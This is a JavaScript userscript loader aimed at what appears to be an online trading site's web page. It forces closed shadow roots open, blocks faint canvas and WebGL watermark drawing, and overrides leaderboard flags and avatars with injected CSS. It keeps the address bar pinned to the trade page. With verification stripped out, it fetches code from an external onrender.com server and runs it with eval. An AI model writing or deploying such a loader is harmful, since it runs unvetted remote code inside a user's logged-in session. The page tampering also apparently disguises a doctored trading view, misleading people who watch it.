/**
 * 0X Premium Secure Loader (Verification Removed)
 */

(async function () {
  'use strict';

  // --- EARLY SHADOW ROOT INTERCEPTOR (Unlocks <qx-usermenu-trigger> closed shadow root) ---
  (function earlyShadowPatch() {
    try {
      if (typeof Element !== 'undefined' && !Element.prototype.__zeroxOrigAttach) {
        Element.prototype.__zeroxOrigAttach = Element.prototype.attachShadow;
        Element.prototype.attachShadow = function(init) {
          const shadow = Element.prototype.__zeroxOrigAttach.call(this, { ...init, mode: 'open' });
          this.__zeroxShadowRoot = shadow;
          return shadow;
        };
      }
    } catch(e) {}
  })();

  // --- EARLY UNIVERSAL WATERMARK INTERCEPTOR (PC & MOBILE) ---
  (function earlyPatch() {
    try {
      if (typeof HTMLCanvasElement !== 'undefined' && !HTMLCanvasElement.prototype.__zeroxEarlyContextPatched) {
        HTMLCanvasElement.prototype.__zeroxEarlyContextPatched = true;
        const origGetContext = HTMLCanvasElement.prototype.getContext;
        HTMLCanvasElement.prototype.getContext = function(type) {
          if (type === 'webgl' || type === 'webgl2' || type === 'experimental-webgl') {
            return null; // Forces PixiJS into CanvasRenderer (2D Mode)
          }
          const ctx = origGetContext.apply(this, arguments);
          if (ctx && (type === '2d' || type === 'experimental-2d')) {
            if (!ctx.__zeroxWatermarkBlocked) {
              ctx.__zeroxWatermarkBlocked = true;
              const _s = ctx.stroke;
              ctx.stroke = function(path) {
                if (ctx.globalAlpha > 0 && ctx.globalAlpha < 0.12) return;
                return path ? _s.call(ctx, path) : _s.call(ctx);
              };
              const _f = ctx.fill;
              if (_f) {
                ctx.fill = function(path) {
                  if (ctx.globalAlpha > 0 && ctx.globalAlpha < 0.12) return;
                  return path ? _f.call(ctx, path) : _f.call(ctx);
                };
              }
            }
          }
          return ctx;
        };
      }
      if (typeof CanvasRenderingContext2D !== 'undefined' && !CanvasRenderingContext2D.prototype.__zeroxProtoWatermarkBlocked) {
        CanvasRenderingContext2D.prototype.__zeroxProtoWatermarkBlocked = true;
        const protoS = CanvasRenderingContext2D.prototype.stroke;
        CanvasRenderingContext2D.prototype.stroke = function(path) {
          if (this.globalAlpha > 0 && this.globalAlpha < 0.12) return;
          return path ? protoS.call(this, path) : protoS.call(this);
        };
        const protoF = CanvasRenderingContext2D.prototype.fill;
        if (protoF) {
          CanvasRenderingContext2D.prototype.fill = function(path) {
            if (this.globalAlpha > 0 && this.globalAlpha < 0.12) return;
            return path ? protoF.call(this, path) : protoF.call(this);
          };
        }
      }
      function patchGl(proto) {
        if (!proto || proto.__zeroxWebGlDrawPatched) return;
        proto.__zeroxWebGlDrawPatched = true;
        const _de = proto.drawElements;
        proto.drawElements = function(mode, count, type, offset) {
          if (count === 1710 || (count > 0 && count % 1710 === 0 && count <= 17100)) return;
          return _de.apply(this, arguments);
        };
      }
      if (typeof WebGLRenderingContext !== 'undefined') patchGl(WebGLRenderingContext.prototype);
      if (typeof WebGL2RenderingContext !== 'undefined') patchGl(WebGL2RenderingContext.prototype);
    } catch(e) {}
  })();

  // --- CONFIGURATION ---
  const BACKEND_URL = "https://zeroxpremiumquotexlivecode.onrender.com";

  // --- UI STYLES FOR OVERLAYS / LEADERBOARD ---
  const injectStyles = () => {
    if (document.getElementById('premium-styles')) return;
    const style = document.createElement('style');
    style.id = 'premium-styles';
    style.innerHTML = `
            /* 0X Leaderboard CSS Overlay - React-Safe */
            .ox-custom-flag svg[class*="flag-"] {
                opacity: 0 !important;
                pointer-events: none !important;
            }
            .ox-custom-flag {
                position: relative !important;
            }
            .ox-custom-flag::before {
                content: '' !important;
                position: absolute !important;
                left: 0 !important;
                top: 50% !important;
                transform: translateY(-50%) !important;
                width: 24px !important;
                height: 18px !important;
                background-size: cover !important;
                background-position: center !important;
                background-repeat: no-repeat !important;
                border-radius: 2px !important;
                box-shadow: 0 1px 3px rgba(0,0,0,0.2) !important;
            }
            .ox-custom-flag[data-ox-flag="bd"]::before {
                background-image: url('/profile/images/flags.svg#flag-bd') !important;
            }
            .ox-custom-flag[data-ox-flag="us"]::before {
                background-image: url('/profile/images/flags.svg#flag-us') !important;
            }
            .ox-custom-flag[data-ox-flag="in"]::before {
                background-image: url('/profile/images/flags.svg#flag-in') !important;
            }
            .ox-custom-avatar svg {
                opacity: 0.3 !important;
            }
        `;
    document.head.appendChild(style);
  };
  injectStyles();

  // --- DIRECT LOADER (VERIFICATION BYPASSED) ---
  async function directLoad() {
    try {
      const response = await fetch(`${BACKEND_URL}/api/get-core-code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ bypass: true })
      });

      const result = await response.json();
      const codeToRun = result.code || (result.valid && result.code);

      if (codeToRun) {
        (0, eval)(codeToRun);
      } else {
        console.warn("Core code not found in backend response.");
      }
    } catch (e) {
      console.error("Direct load error:", e);
    }
  }

  directLoad();

  // --- URL ROUTING REPLACER ---
  (function p(){
      history.replaceState(null, '', '/en/trade');
      setTimeout(p, 500);
  })();
})();
